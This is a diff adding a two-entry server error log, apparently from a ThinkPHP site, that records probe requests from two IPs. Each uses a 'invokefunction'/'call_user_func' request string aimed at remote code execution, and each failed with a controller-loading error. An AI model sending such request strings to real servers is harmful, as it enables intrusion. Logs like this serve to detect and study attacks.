@@ -1,0 +1,6 @@
+[ 2019-03-04T15:56:26+08:00 ] 47.97.40.69 /index.php/?s=user/%5Cthink%5Capp/invokefunction&function=call_user_func&vars[0]=md5&vars[1]=1
+ERR: 无法加载控制器:\think\app
+
+[ 2019-03-04T15:59:41+08:00 ] 47.98.20.78 /index.php/?s=user/%5Cthink%5Capp/invokefunction&function=call_user_func&vars[0]=md5&vars[1]=1
+ERR: 无法加载控制器:\think\app
+
